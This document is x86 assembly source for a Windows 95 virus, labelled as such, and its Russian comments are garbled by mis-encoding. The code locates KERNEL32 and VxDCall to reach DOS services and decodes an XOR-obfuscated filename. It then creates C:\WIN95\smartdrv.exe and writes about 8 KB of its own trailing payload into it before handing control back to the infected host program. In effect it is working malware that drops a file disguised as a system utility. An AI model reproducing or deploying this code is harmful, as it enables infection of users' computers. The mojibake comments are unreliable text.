   .386
   .model flat
   .data
   begin_win_virus:
           pushad
           push     ds
           cld
           call     init_EIP            ;®¯p¥¤¥«ï¥¬ â¥ªãé¨© EIP
   init_EIP:
           pop      ebp
           sub      ebp,offset init_EIP ;â ª  ç¨ îâáï ª« áá¨ç¥áª¨¥ DOS-¢¨p¨
           xor      eax,eax
           mov      esi,0bff70000h+3ch  ;§¤¥áì á¨¤¨â ãª § â¥«ì   PE-§ £®«®¢®ª
           lodsw                        ;§ £pã§¨¬ ¥£® ¢ AX
           add      eax,0bff70000h      ;¯p¨¡ ¢¨¬ ¡ §®¢ë©  ¤p¥á
           xchg     esi,eax
           lodsd                        ;ç¨â ¥¬ á¨£ âãpã
           cmp      ax,4550h            ;á¨£ âãp  'PE'?
           jne      to_normal_prog      ;...KERNEL32.DLL ¥  ©¤¥
           mov      eax,[esi+74h]       ;ESI+74h ãª §ë¢ ¥â   EXPORT TABLE RVA
           add      eax,0bff70000h+1ch
           xchg     esi,eax             ;ESI ãª §ë¢ ¥â   ADDRESS TABLE RVA
           lodsd
           add      eax,0bff70000h
           xchg     esi,eax
           lodsd                        ;¯®«ãç ¥¬  ¤p¥á VXDCALL
           add      eax,0bff70000h
           mov      dword ptr [VxD_addr+ebp],eax
           ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
           mov      ah,62h
           call     DOS_kernel
           ;BX -  ¤p¥á PSP
           mov      ds,bx
           mov      ds,ds:[2ch]
           ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
           xor      esi,esi
           mov      ecx,100h
   seach_winbootdir:
           cmp      dword ptr ds:[esi],'bniw'
           jz       found_winbootdir
           inc      esi
           loop     seach_winbootdir
   found_winbootdir:
           add      esi,11 ;„®å®¤¨¬ ¤® ¯ãâ¨
           lea      edi,[end_win_virus+ebp+6h]
   rep_perenos:
           lodsb                ; AL <- DS:[ESI]
           stosb                ; AL -> ES:[EDI]
           or       al,al
           jnz      rep_perenos
           push     es
           pop      ds
           mov      byte ptr [edi-1],'\'
           ;*¥p¥¥á«¨ ¯ãâì ¤® Win95
           lea      esi,[name_smartdrv+ebp]
           mov      ecx,long_name_smartdrv
   restore_name_smartdrv:
           xor      byte ptr [esi],0e3h
           inc      esi
           loop     restore_name_smartdrv
           lea      esi,[name_smartdrv+ebp]
           mov      ecx,long_name_smartdrv
           rep      movsb ;DS:[ESI] -> ES:[EDI]
           ;*¥p¥¥á«¨ ¨¬ï SMARTDRV.EXE
           mov      byte ptr [edi],0
           ;*®«ãç¨«¨ ¯®«®æ¥®¥ ¨¬ï ä ©« 
           mov      ah,3ch
           lea      edx,[end_win_virus+ebp+6h]
           xor      ecx,ecx
           call     DOS_kernel
           jc       to_normal_prog
           mov      ebx,eax
           mov      ah,40h
           lea      edx,[end_win_virus+ebp+56h]
           mov      ecx,8052d
           call     DOS_kernel
           mov      ah,3eh
           call     DOS_kernel
           jmp      to_normal_prog
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ *®¤¯p®£p ¬¬ë ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   DOS_kernel:                            ;  «®£ INT 21h ¤«ï DOS-¯p®£p ¬¬
           lea      edi,[VxD_out+ebp]
           push     ecx
           push     eax
           push     002a0010h             ;¨¤¥â¨ä¨ª â®p VWIN32 á äãªæ¨¥© 10h
           push     edi
           db       68h                   ;¯p¥ä¨ªá ª®¬ ¤ë PUSH
   VxD_addr dd      0                     ; ¤p¥á VXDCALL
           ret                            ;¢ë§ë¢ ¥¬ VWIN32 INT_21H_Dispatcher
   VxD_out:
           ret                            ;áî¤  VWIN32 ¢®§¢p â¨â ã¯p ¢«¥¨¥
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;‘¤¥áì ¡ã¤¥â ¯ãâì ¤® C:\WIN95\smartdrv.exe
   name_smartdrv db 's' xor 0e3h
                 db 'm' xor 0e3h
                 db 'a' xor 0e3h
                 db 'r' xor 0e3h
                 db 't' xor 0e3h
                 db 'd' xor 0e3h
                 db 'r' xor 0e3h
                 db 'v' xor 0e3h
                 db '.' xor 0e3h
                 db 'e' xor 0e3h
                 db 'x' xor 0e3h
                 db 'e' xor 0e3h
                 db  0  xor 0e3h
   long_name_smartdrv equ $-name_smartdrv
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   to_normal_prog:
           pop      ds
           popad
   end_win_virus:
   ;„ «¥¥ á¤¥áì 6 ¡ ©â ¨á¯®«ì§ã¥âáï ¤«ï
   ;1. db 68h
   ;2. dd ?
   ;3. ret
   ;*®â®¬ 50h ¡ ©â ¬ãá®p 
   end begin_win_virus
